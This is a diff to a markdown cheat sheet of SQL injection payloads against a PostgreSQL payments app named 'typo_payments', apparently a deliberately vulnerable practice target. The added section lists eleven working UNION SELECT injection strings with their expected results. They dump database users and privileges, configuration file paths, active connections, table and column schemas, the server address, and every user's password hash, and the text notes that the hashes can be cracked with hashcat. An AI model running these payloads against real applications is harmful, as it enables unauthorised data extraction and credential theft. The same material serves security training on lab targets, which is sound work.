@@ -253,9 +253,96 @@ SELECT * FROM payments WHERE user_id = 3 AND id = 1 OR 1=1
 
 ---
 
-## 🗂️ Advanced Attacks
+## � Database Credentials & Configuration Extraction
 
-### 23. Extract All Feedback (Including Stored XSS)
+### 27. Get Database Connection Info
+```
+?id=1 UNION SELECT 1, 2, current_database(), 0.00, CONCAT('User: ', current_user, ' | Version: ', version()), 'db_info', CURRENT_TIMESTAMP
+```
+
+**Returns**:
+- Database name: `typo_payments`
+- Current user: `typo_admin`
+- PostgreSQL version
+
+### 28. Extract Configuration File Paths
+```
+?id=1 UNION SELECT 1, 2, name, 0.00, setting, 'config', CURRENT_TIMESTAMP FROM pg_settings WHERE name IN ('config_file', 'hba_file', 'data_directory')
+```
+
+**Returns**:
+- Config file: `/var/lib/postgresql/data/postgresql.conf`
+- Auth config: `/var/lib/postgresql/data/pg_hba.conf`
+- Data directory: `/var/lib/postgresql/data`
+
+### 29. List All Database Users
+```
+?id=1 UNION SELECT 1, 2, usename, 0.00, CONCAT('superuser: ', usesuper::text, ' | createdb: ', usecreatedb::text), 'users', CURRENT_TIMESTAMP FROM pg_user
+```
+
+**Returns**: All PostgreSQL users with their privileges
+
+### 30. List All Databases
+```
+?id=1 UNION SELECT 1, 2, datname, 0.00, CONCAT('owner: ', (SELECT usename FROM pg_user WHERE usesysid = datdba), ' | encoding: ', pg_encoding_to_char(encoding)), 'databases', CURRENT_TIMESTAMP FROM pg_database
+```
+
+**Returns**: All databases on the PostgreSQL server
+
+### 31. Active Database Connections
+```
+?id=1 UNION SELECT 1, 2, datname, 0.00, CONCAT('user: ', usename, ' | client: ', COALESCE(client_addr::text, 'local'), ' | state: ', state), 'connections', CURRENT_TIMESTAMP FROM pg_stat_activity WHERE pid != pg_backend_pid() LIMIT 1
+```
+
+**Returns**: Who else is connected to the database
+
+### 32. Extract Password Hashes from Users Table
+```
+?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users
+```
+
+**Returns**: All user password hashes (can be cracked with hashcat!)
+
+### 33. Database Fingerprint (One-Shot)
+```
+?id=1 UNION SELECT 1, 2, 'FINGERPRINT', 0.00, CONCAT('DB: ', current_database(), ' | User: ', current_user, ' | Ver: ', substring(version() from 1 for 20), ' | Dir: ', (SELECT setting FROM pg_settings WHERE name='data_directory')), 'info', CURRENT_TIMESTAMP
+```
+
+**Returns**: Complete database fingerprint in one query
+
+### 34. List All Tables in Database
+```
+?id=1 UNION SELECT 1, 2, tablename, 0.00, CONCAT('schema: ', schemaname, ' | owner: ', tableowner), 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname = 'public'
+```
+
+**Returns**: All tables (users, payments, feedback, etc.)
+
+### 35. List Columns for Specific Table
+```
+?id=1 UNION SELECT 1, 2, column_name, 0.00, CONCAT('type: ', data_type, ' | nullable: ', is_nullable), table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users'
+```
+
+**Returns**: All columns in the 'users' table with their types
+
+### 36. Get Database Size
+```
+?id=1 UNION SELECT 1, 2, 'db_size', 0.00, pg_size_pretty(pg_database_size(current_database())), 'metrics', CURRENT_TIMESTAMP
+```
+
+**Returns**: Total database size (e.g., "245 kB")
+
+### 37. Server Network Information
+```
+?id=1 UNION SELECT 1, 2, 'network', 0.00, CONCAT('server_addr: ', inet_server_addr()::text, ' | server_port: ', inet_server_port()::text), 'network', CURRENT_TIMESTAMP
+```
+
+**Returns**: PostgreSQL server IP and port
+
+---
+
+## �🗂️ Advanced Attacks
+
+### 38. Extract All Feedback (Including Stored XSS)
 ```
 ?id=1 UNION SELECT id, username, message, message, 5, 6, created_at::text FROM feedback
 ```
